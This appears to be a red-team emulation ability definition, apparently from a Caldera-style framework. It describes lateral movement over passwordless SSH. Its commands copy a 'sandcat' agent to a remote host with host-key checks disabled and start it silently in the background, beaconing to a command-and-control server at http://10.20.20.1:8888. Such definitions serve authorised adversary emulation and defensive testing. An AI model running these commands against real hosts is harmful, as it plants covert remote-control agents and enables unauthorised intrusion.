chain.command: scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux JeffreyKirk@192.168.201.236:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 JeffreyKirk@192.168.201.236 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'

ability.name: Deception copy and start agent over ssh (passwordless)
ability.description: Copy 54ndc47 to remote host and start it

executors.name: sh
executors.command: scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'
